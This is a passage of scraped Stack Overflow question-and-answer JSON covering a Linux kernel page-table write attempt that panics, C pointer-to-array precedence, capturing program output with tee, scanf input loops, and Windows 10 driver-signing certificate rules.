---[ end trace dec6997083161644 ]---\n&lt;0&gt;[  184.776642] Kernel panic - not syncing: Fatal exception\n</code></pre>\n\n<p>EDIT 2:\nI tried using the following code to do a page walk and setting the pte to be write enabled, but writing to the address causes the kernel to die and restart again.</p>\n\n<pre><code>unsigned long my_addr = 0x1C1D50;\npgd = pgd_offset(mm, my_addr);\nif (pgd_none(*pgd) || pgd_bad(*pgd))\n    goto out;\nprints(\"Valid pgd: [%08lx] *pgd=%08llx\\n\", my_addr, (long long)pgd_val(*pgd));\n\npud = pud_offset(pgd, my_addr);\nif (pud_none(*pud) || pud_bad(*pud))\n    goto out;\nprints(\"Valid pud\\n\");\n\npmd = pmd_offset(pud, my_addr);\nif (pmd_none(*pmd) || pmd_bad(*pmd))\n    goto out;\nprints(\"Valid pmd\\n\");\n\nptep = pte_offset_map(pmd, my_addr);\nif (!ptep)\n    goto out;\npte = *ptep;\n\npage = pte_page(pte);\nif (page)\n    prints(\"page frame struct is @ %p\\n\", page);\n\nif (pte_write(pte))\n    prints(\"Pte is writable!\\n\");\nelse {\n    prints(\"Pte is read-only!\\n\");\n    pte = pte_mkwrite(pte);\n    if (pte_write(pte)) {\n        prints(\"Pte is now writable!\\n\");\n        p[0] = 0x02;\n        p[3] = 0x1A;\n        pte = pte_wrprotect(pte);\n    }\n    else\n        prints(\"Pte is still read-only!\\n\");\n}\n</code></pre>\n\n<p>any insights on this issue?</p>\n"}, {"tags": ["c", "pointers"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437544920, "post_id": 31554929, "comment_id": 51067321, "body": "to print the address, use <code>%p</code>"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1437545890, "post_id": 31554929, "comment_id": 51067784, "body": "@LPs no, that&#39;s wrong, see Gopi&#39;s answer."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1437545912, "post_id": 31554929, "comment_id": 51067797, "body": "<code>*(a+0)[1]=41;</code> &lt;- I don&#39;t remember the precedence rules entirely, but if this is parsed as <code>*((a+0)[1]) = 41;</code> then that&#39;s UB."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1437546115, "post_id": 31554929, "comment_id": 51067907, "body": "@LPs <code>a</code> is a pointer to an array, not a pointer to the first element of the array. Thus, <code>*a</code> is the array. Thus, <code>(*a)[0]</code> is its first element, <code>(*a)[1]</code> is its second element, etc."}], "answers": [{"tags": [], "owner": {"reputation": 19499, "user_id": 3883560, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/ndXdL.jpg?s=128&g=1", "display_name": "Gopi", "link": "https://stackoverflow.com/users/3883560/gopi"}, "is_accepted": false, "score": 0, "last_activity_date": 1437545069, "creation_date": 1437545069, "answer_id": 31555061, "question_id": 31554929, "link": "https://stackoverflow.com/questions/31554929/pointer-not-printing-in-the-desired-way/31555061#31555061", "title": "Pointer not printing in the desired way", "body": "<p>What you are looking for is</p>\n\n<pre><code>int (*a)[3] = malloc(sizeof(int) *3);\n\n(*a)[0] = 40;\n(*a)[1] = 41;\n(*a)[2] = 42;\n\n\nprintf(\"%d %d %d\\n\",(*a)[0],(*a)[1],(*a)[2]);\n</code></pre>\n\n<p>a is a pointer to an array of 3 int members. So allocate memory for the pointer and store values as shown above.</p>\n\n<p>If you want the address of where the values are stored then you should do</p>\n\n<pre><code>printf(\"%p\\n\",(void*)(a)[0]);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6855, "user_id": 3125194, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8ca2177750fa502328461e68d385e6d9?s=128&d=identicon&r=PG&f=1", "display_name": "Marian", "link": "https://stackoverflow.com/users/3125194/marian"}, "is_accepted": true, "score": 1, "last_activity_date": 1437547050, "last_edit_date": 1437547050, "creation_date": 1437545543, "answer_id": 31555195, "question_id": 31554929, "link": "https://stackoverflow.com/questions/31554929/pointer-not-printing-in-the-desired-way/31555195#31555195", "title": "Pointer not printing in the desired way", "body": "<p>Indexation has higher precedence than dereferencing a pointer. Your assignments don't do what you want. They are evaluated like:</p>\n\n<pre><code>*((a+0)[0])=40;\n*((a+0)[1])=41;\n*((a+0)[2])=42;\n</code></pre>\n\n<p>If you want to keep your syntax, you shall use parenthesis like:</p>\n\n<pre><code>(*(a+0))[0] = 40;\n(*(a+0))[1] = 41;\n(*(a+0))[2] = 42;\n</code></pre>\n\n<p>The same applies for printing the second element of the array. <code>*(a+0)[1]</code> shall be <code>(*(a+0))[1]</code>.</p>\n"}], "owner": {"reputation": 53, "user_id": 5142036, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/278c87d2a395feed70e2dad6da1cee21?s=128&d=identicon&r=PG&f=1", "display_name": "Akhilesh", "link": "https://stackoverflow.com/users/5142036/akhilesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "accepted_answer_id": 31555195, "answer_count": 2, "score": 1, "last_activity_date": 1437547171, "creation_date": 1437544559, "last_edit_date": 1437547171, "question_id": 31554929, "link": "https://stackoverflow.com/questions/31554929/pointer-not-printing-in-the-desired-way", "title": "Pointer not printing in the desired way", "body": "<p>This is a C code</p>\n\n<pre><code>int (*a)[3];                                                        \n</code></pre>\n\n<p><code>a</code> is a pointer to an array of 3 integers</p>\n\n<pre><code>a=(int (*)[3])malloc(sizeof(int)*3);                                \n</code></pre>\n\n<p>note the Typecast used here; the number of elements must be specified in the typecast shown. Also, the brackets around the <code>*</code> is                                                                           necessary.</p>\n\n<pre><code>printf(\"brrbrrbrr  %d  %d  %d %d\\n\",&amp;a,a,a+1,a+2);\n\n*(a+0)[0]=40;\n*(a+0)[1]=41;\n*(a+0)[2]=42;\nprintf(\"noobnoob  %d %d %d \\n\",a[0][0],*(a+0)[1],(*(*(a+0)+2)));\n</code></pre>\n\n<p>The output is:  </p>\n\n<pre><code>brrbrrbrr  -7077000  29278656  29278668 29278680\nnoobnoob  40 41 0 \n</code></pre>\n\n<p>I am not getting why the last number is 0 instead of 42?</p>\n"}, {"tags": ["c", "linux", "shell"], "answers": [{"comments": [{"owner": {"reputation": 310760, "user_id": 12711, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c330bdee507c95c603a93ca91d9145a9?s=128&d=identicon&r=PG", "display_name": "Michael Burr", "link": "https://stackoverflow.com/users/12711/michael-burr"}, "edited": false, "score": 2, "creation_date": 1437547574, "post_id": 31554915, "comment_id": 51068572, "body": "You might want to use <code>.&#47;a.out 2&gt;&amp;1 | tee log.txt</code> to make you you get both <code>stdout</code> and <code>stderr</code> messages (depending on what you want in the log)."}, {"owner": {"reputation": 43, "user_id": 4914967, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-25xF_fVEQCg/AAAAAAAAAAI/AAAAAAAAAC4/ADvWyWqxQ54/photo.jpg?sz=128", "display_name": "RAJAMANICKAM T", "link": "https://stackoverflow.com/users/4914967/rajamanickam-t"}, "edited": false, "score": 0, "creation_date": 1437548208, "post_id": 31554915, "comment_id": 51068890, "body": "whether ./a.out | tee log.txt does not add stderr and stdout ?"}, {"owner": {"reputation": 43, "user_id": 4914967, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-25xF_fVEQCg/AAAAAAAAAAI/AAAAAAAAAC4/ADvWyWqxQ54/photo.jpg?sz=128", "display_name": "RAJAMANICKAM T", "link": "https://stackoverflow.com/users/4914967/rajamanickam-t"}, "edited": false, "score": 0, "creation_date": 1437548296, "post_id": 31554915, "comment_id": 51068939, "body": "if i want to send mail if any error occurred  by echo &quot;hello world&quot; | mail -s &quot;a subject&quot; someone@somewhere.com method. But i want to detect the error message how should i detect the error message in script ?"}], "tags": [], "owner": {"reputation": 249903, "user_id": 2422776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2353050223ebecb113741c29458de4b2?s=128&d=identicon&r=PG", "display_name": "Mureinik", "link": "https://stackoverflow.com/users/2422776/mureinik"}, "is_accepted": true, "score": 3, "last_activity_date": 1437544501, "creation_date": 1437544501, "answer_id": 31554915, "question_id": 31554846, "link": "https://stackoverflow.com/questions/31554846/linux-how-do-i-capture-all-of-my-compilers-output-to-a-file-as-well-as-need-t/31554915#31554915", "title": "linux - How do I capture all of my compiler&#39;s output to a file as well as need to display output", "body": "<p>You could use <a href=\"http://www.gnu.org/software/coreutils/manual/html_node/tee-invocation.html\" rel=\"nofollow\"><code>tee</code></a>:</p>\n\n<pre><code>$ ./a.out | tee log.txt\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 4914967, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-25xF_fVEQCg/AAAAAAAAAAI/AAAAAAAAAC4/ADvWyWqxQ54/photo.jpg?sz=128", "display_name": "RAJAMANICKAM T", "link": "https://stackoverflow.com/users/4914967/rajamanickam-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 1, "accepted_answer_id": 31554915, "answer_count": 1, "score": 2, "last_activity_date": 1437547208, "creation_date": 1437544243, "last_edit_date": 1437547208, "question_id": 31554846, "link": "https://stackoverflow.com/questions/31554846/linux-how-do-i-capture-all-of-my-compilers-output-to-a-file-as-well-as-need-t", "title": "linux - How do I capture all of my compiler&#39;s output to a file as well as need to display output", "body": "<p>The below program redirects all my output to log file. I need to display all the output along with log file. How can this be achieved?</p>\n\n<pre><code>$ gcc test.c\n$ ./a.out &gt; log.txt\n$\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 27303, "user_id": 1003123, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ef598363853c3081cc13585afbe81d0f?s=128&d=identicon&r=PG", "display_name": "enrico.bacis", "link": "https://stackoverflow.com/users/1003123/enrico-bacis"}, "edited": false, "score": 1, "creation_date": 1437544180, "post_id": 31554811, "comment_id": 51067023, "body": "what is <code>num</code>? Do you want to store the previous numbers?"}, {"owner": {"reputation": 143, "user_id": 4696762, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/2b3b4273b39679d236167b7c38e3d6ed?s=128&d=identicon&r=PG&f=1", "display_name": "Jack8246", "link": "https://stackoverflow.com/users/4696762/jack8246"}, "reply_to_user": {"reputation": 27303, "user_id": 1003123, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ef598363853c3081cc13585afbe81d0f?s=128&d=identicon&r=PG", "display_name": "enrico.bacis", "link": "https://stackoverflow.com/users/1003123/enrico-bacis"}, "edited": false, "score": 0, "creation_date": 1437544296, "post_id": 31554811, "comment_id": 51067067, "body": "sorry editing the question. it is the &#39;x&#39; which is the user input. No not looking to store previous numbers, just needing to print them"}], "answers": [{"tags": [], "owner": {"reputation": 811, "user_id": 4895040, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YLzeG.jpg?s=128&g=1", "display_name": "raymelfrancisco", "link": "https://stackoverflow.com/users/4895040/raymelfrancisco"}, "is_accepted": false, "score": -1, "last_activity_date": 1472972263, "last_edit_date": 1472972263, "creation_date": 1437544450, "answer_id": 31554898, "question_id": 31554811, "link": "https://stackoverflow.com/questions/31554811/using-a-while-loop-to-iterate-through-user-input-until-specific-number/31554898#31554898", "title": "Using a while loop to iterate through user input until specific number", "body": "<p>You need to put <code>scanf()</code> inside the <code>while</code> loop in order to update every new input. No need for arrays if you want to print only the inputted values because you can print it after new input. Better do it with <code>do-while</code> loop.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    int i = 0;\n    int x = 0;\n\n    do {\n        if ( scanf(\"%d\", &amp;x) &lt; 0 )\n            break;\n        printf(\"%d\\n\", x);\n    } while (x != 84);\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1437544513, "post_id": 31554902, "comment_id": 51067158, "body": "+1 for checking the return value of scanf, to avoid inf-loop when user enters something that &quot;%d&quot; won&#39;t scan."}, {"owner": {"reputation": 143, "user_id": 4696762, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/2b3b4273b39679d236167b7c38e3d6ed?s=128&d=identicon&r=PG&f=1", "display_name": "Jack8246", "link": "https://stackoverflow.com/users/4696762/jack8246"}, "edited": false, "score": 0, "creation_date": 1437544722, "post_id": 31554902, "comment_id": 51067235, "body": "Thank you this is exactly what i needed. Could you explain to me how putting the scanf inside the while condition works compared to what i was doing? I am new to C, thanks"}, {"owner": {"reputation": 10297, "user_id": 2425366, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5z1Nm.jpg?s=128&g=1", "display_name": "Shreevardhan", "link": "https://stackoverflow.com/users/2425366/shreevardhan"}, "reply_to_user": {"reputation": 143, "user_id": 4696762, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/2b3b4273b39679d236167b7c38e3d6ed?s=128&d=identicon&r=PG&f=1", "display_name": "Jack8246", "link": "https://stackoverflow.com/users/4696762/jack8246"}, "edited": false, "score": 0, "creation_date": 1437544871, "post_id": 31554902, "comment_id": 51067298, "body": "@Jack8246 You scanned for input once and compared to <code>84</code> again and again, this scans until <code>84</code> is found. That&#39;s the difference. This also checks if scanf correctly reads what it is asked to, <code>int</code> here."}, {"owner": {"reputation": 143, "user_id": 4696762, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/2b3b4273b39679d236167b7c38e3d6ed?s=128&d=identicon&r=PG&f=1", "display_name": "Jack8246", "link": "https://stackoverflow.com/users/4696762/jack8246"}, "edited": false, "score": 0, "creation_date": 1437545301, "post_id": 31554902, "comment_id": 51067499, "body": "@Shreevardhan I see, so by putting the scanf into the while loop, does the while loop automatically iterate through each integer from the user input? This is the main thing I&#39;m not sure about, hence why i had the &#39;i++&#39; in my previous code"}, {"owner": {"reputation": 10297, "user_id": 2425366, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5z1Nm.jpg?s=128&g=1", "display_name": "Shreevardhan", "link": "https://stackoverflow.com/users/2425366/shreevardhan"}, "reply_to_user": {"reputation": 143, "user_id": 4696762, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/2b3b4273b39679d236167b7c38e3d6ed?s=128&d=identicon&r=PG&f=1", "display_name": "Jack8246", "link": "https://stackoverflow.com/users/4696762/jack8246"}, "edited": false, "score": 0, "creation_date": 1437545569, "post_id": 31554902, "comment_id": 51067615, "body": "@Jack8246 Yes. <code>scanf(&quot;%d&quot;, &amp;x);</code> scans an integer in <code>x</code>. Putting this inside a loop condition will execute it in every loop iteration until the loop breaks. So, it scans integers until it finds <code>84</code>. You can read a good book on C programming to get better idea."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437659013, "post_id": 31554902, "comment_id": 51130203, "body": "this does not properly handle the case when scanf() returns EOF"}, {"owner": {"reputation": 10297, "user_id": 2425366, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5z1Nm.jpg?s=128&g=1", "display_name": "Shreevardhan", "link": "https://stackoverflow.com/users/2425366/shreevardhan"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437659264, "post_id": 31554902, "comment_id": 51130413, "body": "How @user3629249 ? In <code>C</code>, <code>EOF</code> is <code>-1</code>. It should work."}, {"owner": {"reputation": 10297, "user_id": 2425366, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5z1Nm.jpg?s=128&g=1", "display_name": "Shreevardhan", "link": "https://stackoverflow.com/users/2425366/shreevardhan"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437660111, "post_id": 31554902, "comment_id": 51131081, "body": "@user3629249 Nevertheless, added the EOF check. THanks."}], "tags": [], "owner": {"reputation": 10297, "user_id": 2425366, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5z1Nm.jpg?s=128&g=1", "display_name": "Shreevardhan", "link": "https://stackoverflow.com/users/2425366/shreevardhan"}, "is_accepted": true, "score": 4, "last_activity_date": 1437660083, "last_edit_date": 1437660083, "creation_date": 1437544453, "answer_id": 31554902, "question_id": 31554811, "link": "https://stackoverflow.com/questions/31554811/using-a-while-loop-to-iterate-through-user-input-until-specific-number/31554902#31554902", "title": "Using a while loop to iterate through user input until specific number", "body": "<p>Push the <code>scanf</code> into the <code>while</code> condition. Something like</p>\n\n<pre><code>while (scanf(\"%d\", &amp;x) != EOF &amp;&amp; x != 84)\n    print(\"%d\\n\", x);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 143, "user_id": 4696762, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/2b3b4273b39679d236167b7c38e3d6ed?s=128&d=identicon&r=PG&f=1", "display_name": "Jack8246", "link": "https://stackoverflow.com/users/4696762/jack8246"}, "edited": false, "score": 0, "creation_date": 1437545371, "post_id": 31554912, "comment_id": 51067531, "body": "the array num was supposed to be &#39;x&#39;, sorry about that. Thanks for the answer"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437658941, "post_id": 31554912, "comment_id": 51130148, "body": "this answer is almost right; however, the OP indicated the 84 was to be printed. so the &#39;if()&#39; statement and the printf() statement need to be swapped. BTW: it is &#39;printf&#39; not &#39;print&#39; and the returned value (not the parameter value) also needs to be checked, so something like a user input that is not digits, like a simple newline and/or a...z, etc can be caught, when the returned value is not 1, need a call to getchar() rather than a call to printf() and if returned value is EOF, then need to exit loop"}], "tags": [], "owner": {"reputation": 27303, "user_id": 1003123, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ef598363853c3081cc13585afbe81d0f?s=128&d=identicon&r=PG", "display_name": "enrico.bacis", "link": "https://stackoverflow.com/users/1003123/enrico-bacis"}, "is_accepted": false, "score": 0, "last_activity_date": 1437659525, "last_edit_date": 1437659525, "creation_date": 1437544493, "answer_id": 31554912, "question_id": 31554811, "link": "https://stackoverflow.com/questions/31554811/using-a-while-loop-to-iterate-through-user-input-until-specific-number/31554912#31554912", "title": "Using a while loop to iterate through user input until specific number", "body": "<p>You have a few errors:</p>\n\n<ul>\n<li>the array <code>num</code> does not exist;</li>\n<li>the <code>scanf</code> must be repeated inside the while loop.</li>\n</ul>\n\n<p>The corrected code is thw following:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    int x;\n    while( 1 ){\n        scanf( \"%d\", &amp;x );\n        print( \"%d\\n\", x );\n        if( x==84 ) break;\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 2, "last_activity_date": 1437544766, "creation_date": 1437544766, "answer_id": 31554984, "question_id": 31554811, "link": "https://stackoverflow.com/questions/31554811/using-a-while-loop-to-iterate-through-user-input-until-specific-number/31554984#31554984", "title": "Using a while loop to iterate through user input until specific number", "body": "<p>The basic concept should be of two-steps:</p>\n\n<ol>\n<li>Read the number</li>\n<li>Check and decide whether to print /continue.</li>\n</ol>\n\n<p>A psuedo-code would look like</p>\n\n<pre><code>while ((ret =scanf(x)) &amp;&amp; ret != EOF ){\n     if (x == VAL) break;\n     printf(x);\n }\n</code></pre>\n"}], "owner": {"reputation": 143, "user_id": 4696762, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/2b3b4273b39679d236167b7c38e3d6ed?s=128&d=identicon&r=PG&f=1", "display_name": "Jack8246", "link": "https://stackoverflow.com/users/4696762/jack8246"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1756, "favorite_count": 0, "accepted_answer_id": 31554902, "answer_count": 4, "score": 0, "last_activity_date": 1472972263, "creation_date": 1437544091, "last_edit_date": 1437784362, "question_id": 31554811, "link": "https://stackoverflow.com/questions/31554811/using-a-while-loop-to-iterate-through-user-input-until-specific-number", "title": "Using a while loop to iterate through user input until specific number", "body": "<p>I am trying to print out each integer on a new line, given integers separated by whitespace from a user input. It stops printing after a specific number, lets say 84. For example</p>\n\n<p>The user input is</p>\n\n<pre><code>20 -4 84 8\n</code></pre>\n\n<p>How could i use a while loop to print these out as</p>\n\n<pre><code>20\n-4\n84\n</code></pre>\n\n<p>i know about scanf(\"%d %d %d %d\", a, b, c, d), However the input size would be unknown, such that there could be only 3 numbers or 7 numbers. So far i have:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    int i = 0;\n    int x = 0;\n    scanf(\"%d\", &amp;x);\n    while (x != 84) {\n        print(\"%d\\n\", x[i]);\n        i++;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "windows", "driver"], "comments": [{"owner": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 0, "creation_date": 1456802894, "post_id": 31554252, "comment_id": 59104745, "body": "After one year, does the answer to this question have any updates?"}], "answers": [{"comments": [{"owner": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 0, "creation_date": 1437545181, "post_id": 31554344, "comment_id": 51067446, "body": "Hi, I don&#39;t know if you understand me right, what I want is not just slip a driver, but slip a certificate, I want to buy a non-EV certificate from Symantec and use this certificate to sign drivers in the following 3 years. I have known that the drivers signed before Win10 RTM release will work on Win10, so this is not what I asked."}, {"owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "reply_to_user": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 0, "creation_date": 1437545853, "post_id": 31554344, "comment_id": 51067757, "body": "One more link: <a href=\"https://msdn.microsoft.com/en-us/library/windows/hardware/ff548231%28v=vs.85%29.aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/windows/hardware/&hellip;</a>.  &quot;Windows 10 for desktop editions (Home, Pro, and Enterprise) and Windows Server Technical Preview kernel-mode drivers must be signed by the Windows Hardware Dev Center Dashboard and the Windows Hardware Dev Center Dashboard requires an EV certificate. For more info about these changes, see <a href=\"http://bit.ly/1CParx5\" rel=\"nofollow noreferrer\">Driver Signing Changes in Windows 10</a>&quot;.  Again - if you want to try it: better hurry, and better have a Plan B."}, {"owner": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 0, "creation_date": 1437546167, "post_id": 31554344, "comment_id": 51067932, "body": "I saw that link, I know MS wants us to use EV certificate, but this is not what I asked. Why I don&#39;t try it is even a 3-year non-EV cert is not cheap, I don&#39;t want to buy one to see that it can&#39;t be used to sign drivers for Win10 after Win10 RTM release."}, {"owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "reply_to_user": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 0, "creation_date": 1437547067, "post_id": 31554344, "comment_id": 51068325, "body": "Two more links: <a href=\"https://www.osronline.com/showthread.cfm?link=265015\" rel=\"nofollow noreferrer\">Extended Validation Code Signing Certificiate</a>, and <a href=\"https://www.osr.com/blog/2015/03/18/microsoft-signatures-required-km-drivers-windows-10/\" rel=\"nofollow noreferrer\">Microsoft Signatures to be REQUIRED for Windows 10 Kernel-Mode Drivers</a>.  &#39;Hope that helps ... and you have my sympathy..."}, {"owner": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 0, "creation_date": 1437547973, "post_id": 31554344, "comment_id": 51068768, "body": "OK, I saw &quot;These requirements only apply to Windows 10 and later.  In fact, Microsoft plans to offer a bit of a grace period: Drivers signed before Windows 10 RTM will be able to use the older signing mechanisms.  But once Windows 10 ships, if you want your driver to run on Windows 10 desktop systems, you\u2019ll need to (a) get an EV certificate, (b) using that signature submit your driver to sysdev to get Microsoft\u2019s signature.&quot; in your link, so I think the answer is NO, thanks!"}, {"owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "reply_to_user": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 1, "creation_date": 1437548412, "post_id": 31554344, "comment_id": 51069007, "body": "To repeat: if you want to support Windows 10 .. and you don&#39;t want to purchase an EV certificate ... then a) you&#39;d better hurry, and b) you&#39;d better have a fallback if things don&#39;t work out for your Windows 10 customers.  Good luck!"}, {"owner": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 0, "creation_date": 1437549316, "post_id": 31554344, "comment_id": 51069516, "body": "My project is going on these months, and it&#39;s hard for me to release a final   version before Win10 RTM release. Currently I have a one-year non-EV cert, I think I will try this cert on Win10 after its release, if it didn&#39;t work I will buy an EV cert then."}, {"owner": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang 